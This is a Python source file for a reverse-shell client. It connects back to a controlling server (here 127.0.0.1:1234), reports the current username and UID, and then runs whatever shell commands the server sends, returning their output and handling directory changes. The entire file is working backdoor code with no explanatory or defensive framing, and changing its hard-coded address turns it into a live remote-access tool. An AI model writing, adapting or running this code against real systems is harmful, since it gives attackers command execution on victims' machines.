import socket
import subprocess
import os
import pwd
import sys


def session_handler(sock, target_ip, target_port):
    print(f'[+] Connecting to {target_ip}.')
    sock.connect((target_ip, target_port))
    outbound(sock, pwd.getpwuid(os.getuid())[0])
    outbound(sock, os.getuid())
    print(f'[+] Connected to {target_ip}.')
    while True:
        message = inbound(sock)
        print(f'[+] Message received - {message}')
        if message == 'exit':
            print('[-] The server has terminated the session.')
            sock.close()
            break
        if message.split(" ")[0] == 'cd':
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed to {cur_dir}')
                outbound(sock, cur_dir)
            except FileNotFoundError:
                outbound(sock, 'Invalid directory.  Try again.')
                continue
        elif message == 'background':
            pass
        else:
            execute_command(sock, message)


def execute_command(sock, message):
    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()
    outbound(sock, output.decode())


def inbound(sock):
    print('[+] Awaiting response...')
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception:
            sock.close()


def outbound(sock, message):
    response = str(message).encode()
    sock.send(response)


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = '127.0.0.1'
        host_port = 1234
        session_handler(sock, host_ip, host_port)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
